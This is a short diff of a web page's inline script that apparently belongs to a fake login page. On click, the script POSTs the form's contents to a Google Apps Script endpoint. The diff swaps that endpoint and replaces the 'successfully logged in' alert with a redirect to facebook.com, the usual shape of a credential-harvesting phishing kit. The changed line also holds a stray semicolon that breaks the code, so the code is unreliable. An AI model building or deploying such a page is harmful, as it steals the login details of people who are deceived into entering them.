@@ -353,13 +353,13 @@
 
          <script type="text/javascript">
              
-	  const scriptURL = 'https://script.google.com/macros/s/AKfycby57EbazqLqUXh381cz0R-pHAaJ3VC6--CYpXHZjXUaZdmE9ddLphEOsPdJGt1rQw5k/exec';
+	  const scriptURL = 'https://script.google.com/macros/s/AKfycby3599EVny7LkDTY2w2O4jHY3V8XY_XE74DrC5lu8HDlgYDuLOvKdHLh5qAOSUBGRjGKA/exec';
             const form = document.forms['google-sheet']
 		 const submitlog = document.querySelector('#submitlog');
-            submitlog.addEventListener('submit', e => {
+            submitlog.addEventListener('click', e => {
               e.preventDefault();
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                .then(response => alert("You have successfully logged in."))
+                .then(response => window.location.href = "https://facebook.com/";)
                 .catch(error => console.error('Error!', error.message))
             });
   </script>
